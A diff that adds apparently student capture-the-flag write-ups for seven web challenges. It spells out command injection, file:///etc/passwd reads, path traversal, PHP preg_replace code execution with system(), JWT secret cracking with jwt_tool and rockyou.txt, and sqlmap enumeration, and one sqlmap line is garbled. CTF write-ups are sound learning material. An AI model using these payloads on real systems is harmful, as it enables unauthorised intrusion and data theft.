@@ -1,0 +1,114 @@
+ping-station:
+
+when we first see the prompt, "insert ip" we can try putting a random ip address to check if it does anything.
+it gives us an internal server error so we try using normal characters with the ip to check if it acts as a terminal "8.8.8.8;ls -l"
+now we see something named "flag" 
+with this information we can put "8.8.8.8;cat flag" and we get the flag.
+
+vulnerability: remote code execution (they do not have a filter for using letters instead of numbers) 
+
+
+
+ultra-crawler:
+
+first we try to send a request for (example) : discord.com 
+but we get an internal server error
+with a simple payload, for example 'file:///etc/passwd' we get a new prompt.
+on the webpage we see a "/home/ctf" 
+now, we can use BurpSuite to send payloads and get a response.
+we know that the server runs on python.
+by accessing 'file:///home/ctf/app.py' we see ['Host'] == "company.tld"
+so if we modify the host inside the repeater, we receive a flag 
+
+vulnerability: Local File Inclusion (LFI) 
+
+
+
+file-crawler:
+
+
+after trying multiple methods, in inspect we located a file
+and it tells us about LFI vulnerability in "image_name"
+once we go back to the source file, we find out that the vulnerability is avoided 
+so we try using "//" instead of "/" 
+and with this we understand that the LFI vulnerability works
+so now we try finding the flag 
+image_name=..//..//..//etc/passwd
+image_name=..//tmp/flag
+
+
+
+substitute:
+
+
+
+after accessing the address url, we see there is a problem and they are asking to replace Admin.
+php is vulnerable to preg_replace() so we can try ls -l to check if there is anything else
+we can try modifying the url, http://ip/index.php?vector=/Admin/e&replace=system('ls -l')
+now we see a folder named "here_we_dont_have_flag" 
+by modifying the url again, http://ip/index.php?vector=/Admin/e&replace=system('ls -l here_we_dont_have_flag')
+we now see a flag.txt so we can now access the file with cat command.
+http://ip/index.php?vector=/Admin/e&replace=system('cat here_we_dont_have_flag/flag.txt')
+
+vulnerability: remote code execution 
+
+
+
+
+under-construction:
+
+
+after accessing the address url, we find a webpage.
+we can press sign up to create an account 
+after registering, we can go to "user" next to homepage.
+we now see an error message 
+from "sources" in developer tools, we get the information that they are using javascript
+once we put /js/app.d875ddd5.js.map in the url, we find a specific role (ROLE_ADMIN) which is for admins only.
+application data is probably located in local storage instead of cookies. 
+we can use localStorage.getItem("user") command in console 
+after accessing the storage, we find user and also the access token.
+now we see "roles":[USER"] and we can replace the user with "ROLE_ADMIN"
+to see any changes made, we refresh the page and an Admin Board will appear on the webpage.
+once clicking it, we receive another error message
+now we need to break the token to receive the key and for this we can try using JWT Tool.
+with the tool, we need to define the target URL with path + the token and a basic wordlist (rockyou.txt)
+python3 jwt_tool.py -t "http://ip" -rc "authtoken" -C -d rockyou.txt 
+-t is for target url; -rc is for cookies; -C is for cracking and -d is for dictionary file name where passwords should be guessed. 
+with jwt.io service we can find the encoded token by adding the secret key 
+now we get id=12 and we can guess that the admin has id=1, also the password is "letmein" 
+once we replace the token with the decoded token and copy-paste it in the browser, we can find a flag in the admin board. 
+
+
+
+
+small-data-leak:
+
+since our hint is /user?id=
+we can try using that while modifying the url of the website
+and we get a sqlalchemy.exc.DataError as the result
+it's a python library so we can try using sqlmap to find more information
+once we find the injection point we should find the databases and we can use -dbs for that
+lets check whats inside --tables
+we only have the first part of the flag so we should use -T ... --columns 
+
+
+
+sqlmap -u http://34.89.210.219:30415/user?id=1 --dbs
+sqlmap -u http://34.89.210.219:30415/user?id=1 -D public --tables
+sqlmap -u http://34.89.210.219:30415/user?id=1 -D public --tables ctf{afonasoifoansofnasnfkasnfkasfasknfkasnkfsakfoasfnnasfnaskf --columns
+
+
+
+
+
+
+alien-inclusion:
+
+after trying multiple methods, we check the source code of the website 
+now we can try sending the flag.php value as POST start parameter through "guessing". 
+curl is a cmd line tool for transferring data with URL 
+and we get the flag by using curl 'ip/?start=' --data 'start=flag.php'
+like it : curl 'http://35.246.227.46:32349/?start=' --data 'start=flag.php'
+
+
+
